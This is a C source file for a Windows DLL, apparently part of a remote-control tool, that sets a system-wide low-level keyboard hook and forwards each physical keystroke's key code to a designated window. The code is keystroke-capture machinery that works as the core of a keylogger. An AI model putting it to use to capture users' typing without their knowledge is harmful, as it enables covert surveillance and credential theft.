#define _WIN32_WINNT 0x0500

#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <stdlib.h>
#include <stdio.h>
#include <crtdbg.h>
#include "..\zxsCommon\debugoutput.h"
#include "ctrldll.h"


HINSTANCE g_hHookIns;

#pragma data_seg(".SharedData")

//�������ݶ�һ��Ҫ��ʼ��
HHOOK hLLKeyboardHook = NULL;
HWND g_hWnd = NULL;

#pragma data_seg( )

LRESULT CALLBACK LowLevelKeyboardFilterProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	// Are we expected to handle this callback?
	if (nCode == HC_ACTION)
	{
		// Is this keyboard event "real" or "injected"
		// i.e. hardware or software-produced?
		KBDLLHOOKSTRUCT *hookStruct = (KBDLLHOOKSTRUCT*)lParam;

		if (!(hookStruct->flags & LLKHF_INJECTED)) {
			// Message was not injected - reject it!

			return SendMessage(g_hWnd, ZX_KEYEVENT, hookStruct->vkCode, hookStruct->flags);

		}
		
	}

	// Otherwise, pass on the message
	return CallNextHookEx(hLLKeyboardHook, nCode, wParam, lParam);
}

HHOOK WINAPI SetKeybdHook(HWND hwnd)
{
	hLLKeyboardHook = SetWindowsHookEx(
			WH_KEYBOARD_LL,					// Hook in before msg reaches app
			(HOOKPROC) LowLevelKeyboardFilterProc,			// Hook procedure
			g_hHookIns,						// This DLL instance
			0L								// Hook in to all apps
			);

	g_hWnd = hwnd;

	return hLLKeyboardHook;
}

BOOL WINAPI UnSetKeybdHook()
{
	if (hLLKeyboardHook != NULL)
	{
		// Stop the hook...
		if (!UnhookWindowsHookEx(hLLKeyboardHook))
			return FALSE;
		hLLKeyboardHook = NULL;
	}

	return TRUE;
}

BOOL APIENTRY DllMain( HANDLE hModule, 
                       DWORD  ul_reason_for_call, 
                       LPVOID lpReserved
					 )
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:

		g_hHookIns = (HINSTANCE)hModule;


		break;

	case DLL_PROCESS_DETACH:

		return TRUE;
    }
	
	return TRUE;
}
